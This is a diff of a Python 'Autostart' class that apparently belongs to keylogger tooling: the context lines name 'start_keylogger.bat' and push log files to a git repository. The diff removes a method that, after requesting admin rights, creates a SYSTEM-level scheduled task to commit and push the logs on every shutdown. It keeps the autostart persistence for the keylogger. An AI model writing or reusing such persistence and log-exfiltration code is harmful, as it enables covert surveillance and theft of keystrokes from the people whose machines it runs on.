@@ -27,41 +27,6 @@ class Autostart:
         os.system(f'git -C {self.repo_path} commit -m "Update {log_file}"')
         os.system(f'git -C {self.repo_path} push')
 
-    def create_shutdown_task(self, repo_path):
-        task_name = "GitPushOnShutdown"
-        task_description = "Push changes to Git repository on system shutdown"
-        trigger_event = "On an event"
-        log = "System"
-        source = "USER32"
-        event_id = "1074"
-
-        if is_admin():
-            # Your existing code to create the scheduled task
-            log = "System"
-            source = "USER32"
-            event_id = "1074"
-            task_name = "GitPushOnShutdown"
-            repo_path = r"C:\Tim-Paris-Schule\OwnProjects\Matteo406"
-            git_commands = f'git -C {repo_path} add . && git -C {repo_path} commit -m "Update" && git -C {repo_path} push'
-
-            command = [
-                "schtasks", "/Create", "/TN", task_name, "/TR", f'cmd /c "{git_commands}"',
-                "/SC", "ONEVENT", "/EC", log, "/MO", f'*[System/EventID={event_id}]',
-                "/RU", "SYSTEM", "/RL", "HIGHEST", "/F", "/NP"
-            ]
-
-            try:
-                subprocess.run(command, check=True)
-                print(f"Task '{task_name}' created successfully.")
-            except subprocess.CalledProcessError as e:
-                print(f"Failed to create task: {e}")
-        else:
-            # Re-run the script with elevated privileges
-            print("Requesting administrative privileges...")
-            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
-
-
-       
 
     def create_autostart_script(self, repo_path, script_name='start_keylogger.bat'):
         # Determine the path to the autostart folder
@@ -159,8 +124,6 @@ if __name__ == '__main__':
         # Create the autostart script
         autostart = Autostart(repo_path)
 
-        # Create the shutdown task
-        autostart.create_shutdown_task(repo_path)
 
         autostart.create_autostart_script(repo_path)
 
